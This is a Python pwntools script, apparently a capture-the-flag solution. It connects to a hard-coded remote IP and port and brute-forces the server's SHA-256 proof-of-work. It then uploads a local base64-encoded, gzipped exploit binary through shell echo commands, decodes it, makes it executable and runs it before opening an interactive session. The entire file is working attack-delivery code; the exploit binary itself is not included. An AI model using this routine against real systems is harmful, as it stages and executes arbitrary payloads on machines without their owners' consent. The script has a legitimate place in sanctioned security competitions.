#!/usr/bin/python3
from pwn import *
import sys
import subprocess

import itertools
import hashlib
import string

table = string.ascii_letters + string.digits + "._"
#config
context(os='linux', arch='i386')
#context.log_level = 'debug'

FILE_NAME = "./solver.gz.enc"
HOST = "168.119.108.148"
PORT = 14010


#elf = ELF(FILE_NAME)
#addr_main = elf.symbols["main"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#off_binsh = next(libc.search(b"/bin/sh"))

def hashcash(conn):
	conn.recvuntil("????")
	suffix = conn.recvuntil("\"")[:-1].decode('utf-8')
	conn.recvuntil(" = ")
	hashval = conn.recvline()[:-1].decode('utf-8')
	
	ans = ''
	for v in itertools.product(table, repeat=4):
		if hashlib.sha256((''.join(v) + suffix).encode()).hexdigest() == hashval:
			print("[+] Prefix = " + ''.join(v))
			ans = ''.join(v)
			break
	else:
		print("[-] Solution not found :thinking_face:")
	conn.sendline(ans)
	print("[+] hashcode done")


def send_exploit(conn):
	conn.sendlineafter("$", "cd /tmp")
	f = open(FILE_NAME, 'r')
	c = f.read()
	
	print("[+] Send exploit")
	block_size = 0x1000
	for i in range(0, len(c), block_size):
		end = i+block_size if i+block_size < len(c) else len(c)
		s = c[i:end]
		conn.sendlineafter("$", 'echo -n "{}" >> solver.gz.enc'.format(s))
		print("[+] Send {} bytes".format(hex(i)))
	conn.sendlineafter("$", "base64 -d solver.gz.enc > solver.gz")
	conn.sendlineafter("$", "gzip -d ./solver.gz")
	conn.sendlineafter("$", "chmod u+x ./solver")
	conn.sendlineafter("$", "./solver")
	

if __name__ == "__main__":
	while True:
		conn = remote(HOST, PORT)
		hashcash(conn)	
		send_exploit(conn)	
		conn.interactive()	
